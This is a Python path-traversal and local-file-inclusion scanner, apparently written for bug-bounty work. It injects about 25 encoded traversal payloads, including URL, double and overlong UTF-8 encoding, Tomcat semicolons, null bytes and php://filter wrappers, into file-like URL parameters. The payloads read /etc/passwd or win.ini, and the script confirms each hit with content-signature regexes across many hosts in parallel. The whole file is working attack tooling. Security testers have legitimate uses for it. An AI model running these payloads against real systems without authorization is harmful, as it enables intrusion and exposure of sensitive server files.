#!/usr/bin/env python3
"""
path_traversal.py — Path Traversal / LFI Scanner
Tests file-like parameters with 20+ encoding variants to bypass input filters.
Detects successful traversal via known file signatures and baseline comparison.

Encoding variants: basic, URL-encoded, double-encoded, overlong UTF-8,
Java/Tomcat semicolons, null byte, path normalization, PHP wrappers,
Windows backslashes.

Usage:
  python3 path_traversal.py -i urls.txt -o findings.txt -t 10
  python3 path_traversal.py -i urls.txt -o /dev/stdout --dry-run
"""

import argparse
import base64
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "noleak"
DEFAULT_TIMEOUT = 10

# File-like parameter names to target
FILE_PARAMS = {
    "file", "path", "doc", "template", "page", "include", "dir", "img",
    "image", "attachment", "download", "load", "read", "content", "folder",
    "src", "source", "filename", "filepath", "name",
}

# ── Traversal Payloads ──────────────────────────────────────────
# (payload, technique_name, target_file)
# target_file is used to select the right detection signatures
PAYLOADS = [
    # === Basic traversal (Linux) ===
    ("../../../etc/passwd", "BASIC_3", "passwd"),
    ("../../../../etc/passwd", "BASIC_4", "passwd"),
    ("../../../../../etc/passwd", "BASIC_5", "passwd"),

    # === URL-encoded ===
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL_ENCODE", "passwd"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "URL_ENCODE_PARTIAL", "passwd"),

    # === Double URL-encoded ===
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
     "DOUBLE_ENCODE", "passwd"),

    # === Overlong UTF-8 ===
    ("%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
     "OVERLONG_UTF8", "passwd"),

    # === Java/Tomcat semicolon bypass ===
    ("..;/..;/..;/etc/passwd", "JAVA_SEMICOLON", "passwd"),
    ("/..;/..;/..;/etc/passwd", "JAVA_SEMICOLON_ABS", "passwd"),

    # === Null byte (PHP < 5.3.4) ===
    ("../../../etc/passwd%00.png", "NULL_BYTE_PNG", "passwd"),
    ("../../../etc/passwd%00.jpg", "NULL_BYTE_JPG", "passwd"),

    # === Path normalization bypass ===
    ("....//....//....//etc/passwd", "DOUBLE_DOT_SLASH", "passwd"),
    ("..../\\..../\\..../\\etc/passwd", "DOT_BACKSLASH_MIX", "passwd"),
    ("....//....//....//....//etc/passwd", "DOUBLE_DOT_4", "passwd"),

    # === Absolute path ===
    ("/etc/passwd", "ABSOLUTE", "passwd"),

    # === PHP wrappers ===
    ("php://filter/convert.base64-encode/resource=../../../etc/passwd",
     "PHP_FILTER_B64", "passwd_b64"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd",
     "PHP_FILTER_B64_ABS", "passwd_b64"),
    ("php://filter/read=string.rot13/resource=/etc/passwd",
     "PHP_FILTER_ROT13", "passwd_rot13"),
    ("file:///etc/passwd", "FILE_WRAPPER", "passwd"),

    # === Mixed encoding ===
    ("..%252f..%252f..%252fetc/passwd", "MIXED_ENCODE", "passwd"),
    ("%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd", "URL_BACKSLASH_LINUX", "passwd"),

    # === Windows variants ===
    ("..\\..\\..\\..\\windows\\win.ini", "BACKSLASH_WIN", "winini"),
    ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "URL_BACKSLASH_WIN", "winini"),
    ("%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
     "DOUBLE_BACKSLASH_WIN", "winini"),
    ("....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
     "DOUBLE_BACKSLASH_NORM", "winini"),
]

# ── Detection Signatures ────────────────────────────────────────
# Grouped by target file for efficient checking.

SIGNATURES = {
    "passwd": [
        (re.compile(r"root:x?:0:0:"), "root:x:0:0"),
        (re.compile(r"root:\*:0:0:"), "root:*:0:0"),
        (re.compile(r"/bin/(?:ba)?sh"), "/bin/sh or /bin/bash"),
        (re.compile(r"daemon:x?:\d+:\d+:"), "daemon user entry"),
        (re.compile(r"nobody:x?:\d+:\d+:"), "nobody user entry"),
    ],
    "passwd_b64": [
        # base64 of "root:x:0:0:" = cm9vdDp4OjA6MDo=
        (re.compile(r"cm9vdDp4OjA6"), "/etc/passwd base64 (root:x:0:0)"),
        # base64 of "root:*:0:0:" = cm9vdDoqOjA6MDo=
        (re.compile(r"cm9vdDoqOjA6"), "/etc/passwd base64 (root:*:0:0)"),
    ],
    "passwd_rot13": [
        # rot13 of "root:" = "ebbg:"
        (re.compile(r"ebbg:k?:\d+:\d+:"), "/etc/passwd rot13 (ebbg:)"),
    ],
    "winini": [
        (re.compile(r"\[extensions\]", re.I), "win.ini [extensions]"),
        (re.compile(r"\[fonts\]", re.I), "win.ini [fonts]"),
        (re.compile(r"; for 16-bit app support", re.I), "win.ini header comment"),
    ],
    "php_source": [
        (re.compile(r"<\?php"), "PHP source code"),
    ],
}

# Rate limit: per-host delay tracking
_host_locks = {}
_host_lock_mutex = threading.Lock()
HOST_DELAY = 0.15  # 150ms between requests to same host


def _get_host_lock(host):
    with _host_lock_mutex:
        if host not in _host_locks:
            _host_locks[host] = threading.Lock()
        return _host_locks[host]


def _rate_limit(host):
    lock = _get_host_lock(host)
    with lock:
        time.sleep(HOST_DELAY)


def safe_request(session, url, timeout):
    """Make a GET request, return (status, body, length) or (None, '', 0)."""
    try:
        parsed = urlparse(url)
        _rate_limit(parsed.netloc)
        resp = session.get(url, allow_redirects=True, timeout=timeout, verify=False)
        return resp.status_code, resp.text, len(resp.text)
    except requests.RequestException:
        return None, "", 0


def inject_param(url, param, payload):
    """Replace a parameter value in the URL with the payload.

    Uses raw string concatenation to preserve already-encoded payloads
    (e.g., %2e%2e, %252e, %c0%ae) without double-encoding them.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        return None

    params[param] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    new_query = "&".join(f"{k}={v}" for k, v in flat.items())
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))


def get_file_params(url):
    """Extract parameter names that look file-related."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    file_params = [p for p in params if p.lower() in FILE_PARAMS]
    # If no known file params matched, test all params
    if not file_params:
        file_params = list(params.keys())
    return file_params


def check_signatures(body, target_file):
    """Check response body for file-content signatures.

    Returns list of (description, is_critical) tuples.
    """
    matches = []
    sigs = SIGNATURES.get(target_file, [])
    for pattern, desc in sigs:
        if pattern.search(body):
            matches.append((desc, True))

    # For base64 PHP wrapper results, try decoding and checking for PHP source
    if target_file == "passwd_b64" and not matches:
        # Try to find and decode a base64 blob
        b64_match = re.search(r"[A-Za-z0-9+/]{20,}={0,2}", body)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group()).decode("utf-8", errors="ignore")
                for pattern, desc in SIGNATURES.get("passwd", []):
                    if pattern.search(decoded):
                        matches.append((f"{desc} (decoded from base64)", True))
                for pattern, desc in SIGNATURES.get("php_source", []):
                    if pattern.search(decoded):
                        matches.append((f"{desc} (decoded from base64)", True))
            except Exception:
                pass

    return matches


def get_baseline(session, url, param, timeout):
    """Get baseline response for a non-existent file path.

    Returns (status, body_length) for comparison.
    """
    test_url = inject_param(url, param, "bb_nonexistent_traversal_probe_99.txt")
    if not test_url:
        return None, 0
    status, _body, size = safe_request(session, test_url, timeout)
    return status, size


def test_traversal(session, url, param, timeout):
    """Test all traversal payloads on a single URL parameter."""
    findings = []

    # Step 1: Get baseline
    baseline_status, baseline_size = get_baseline(session, url, param, timeout)

    # Step 2: Also get original response for comparison
    orig_status, orig_body, orig_size = safe_request(session, url, timeout)

    confirmed_file = None  # Stop after first confirmed read per param

    for payload, technique, target_file in PAYLOADS:
        if confirmed_file:
            break

        test_url = inject_param(url, param, payload)
        if not test_url:
            continue

        status, body, size = safe_request(session, test_url, timeout)
        if status is None:
            continue

        # Check for file-content signatures
        sig_matches = check_signatures(body, target_file)

        if sig_matches:
            # Verify this content was NOT in the original/baseline response
            orig_sigs = check_signatures(orig_body, target_file) if orig_body else []
            if orig_sigs:
                continue  # Signature present in original response — false positive

            confirmed_file = target_file
            for desc, is_critical in sig_matches:
                if target_file in ("passwd", "passwd_b64", "passwd_rot13"):
                    if "root:" in desc.lower() or "root:x:" in desc.lower() or "base64" in desc.lower():
                        severity = "P1:PATH_TRAVERSAL:CRIT"
                    else:
                        severity = "P1:PATH_TRAVERSAL:HIGH"
                elif target_file == "winini":
                    severity = "P1:PATH_TRAVERSAL:HIGH"
                elif target_file == "php_source":
                    severity = "P1:PATH_TRAVERSAL:HIGH"
                else:
                    severity = "P1:PATH_TRAVERSAL:HIGH"

                findings.append(
                    f"[{severity}] {technique} | {url} param={param} | "
                    f"{desc} | status={status} size={size}"
                )
            continue

        # Heuristic: significant size difference suggests possible file read
        if (baseline_size and size > 0 and status == 200
                and size != baseline_size and size != orig_size):
            ratio = size / max(baseline_size, 1)
            if ratio > 3.0:
                # Exclude obvious error pages
                error_indicators = [
                    "not found", "error", "invalid", "forbidden",
                    "denied", "404", "unauthorized", "bad request",
                ]
                if not any(ind in body.lower()[:500] for ind in error_indicators):
                    findings.append(
                        f"[P2:PATH_TRAVERSAL:MEDIUM] {technique}_SIZE_ANOMALY | "
                        f"{url} param={param} | "
                        f"Response size anomaly ({baseline_size} -> {size}, "
                        f"ratio={ratio:.1f}x) — manual verification needed | "
                        f"status={status}"
                    )

    return findings


def test_url(session, url, timeout):
    """Test all file-like parameters in a URL."""
    all_findings = []
    params = get_file_params(url)
    if not params:
        return all_findings

    for param in params:
        all_findings.extend(test_traversal(session, url, param, timeout))

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="Path Traversal / LFI Scanner"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with URLs")
    parser.add_argument("-o", "--output", required=False,
                        help="Output file for findings")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--max-urls", type=int, default=2000,
                        help="Max URLs to test (default: 2000)")
    parser.add_argument("--user-agent", default=DEFAULT_UA,
                        help="User-Agent string (default: noleak)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print payloads that would be tested without sending requests")
    args = parser.parse_args()

    # Read input URLs
    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Pre-filter: only URLs with file-like parameters
    file_param_re = re.compile(
        r"[?&](file|path|doc|template|page|include|dir|img|image|attachment|"
        r"download|load|read|content|folder|src|source|filename|filepath|name)=",
        re.I,
    )
    skip_ext = re.compile(
        r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
        r"pdf|zip|tar|gz|mp4|mp3|webp|avif)(\?|$)", re.I,
    )
    urls = [u for u in raw_urls
            if file_param_re.search(u) and not skip_ext.search(u)]

    # Deduplicate by host + path (keep first seen)
    seen = set()
    deduped = []
    for url in urls:
        p = urlparse(url)
        key = f"{p.netloc}{p.path}"
        if key not in seen:
            seen.add(key)
            deduped.append(url)
    urls = deduped[:args.max_urls]

    print(f"[*] Loaded {len(raw_urls)} raw URLs, "
          f"filtered to {len(urls)} with file-like params")

    # Dry-run: show what would be tested
    if args.dry_run:
        for url in urls:
            params = get_file_params(url)
            for param in params:
                for payload, technique, target_file in PAYLOADS:
                    test_url_str = inject_param(url, param, payload)
                    if test_url_str:
                        print(f"[DRY-RUN] [{technique}] param={param} "
                              f"target={target_file} | {test_url_str}")
        print(f"\n[*] {len(urls)} URLs x {len(PAYLOADS)} payloads = "
              f"{len(urls) * len(PAYLOADS)} requests (max)")
        return

    # Build session
    session = requests.Session()
    session.headers.update({"User-Agent": args.user_agent})

    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_url(url):
        findings = test_url(session, url, args.timeout)
        with lock:
            completed[0] += 1
            if completed[0] % 25 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(urls)} URLs tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}")

    # Write findings
    if args.output and all_findings:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} URLs, {len(all_findings)} findings")


if __name__ == "__main__":
    main()
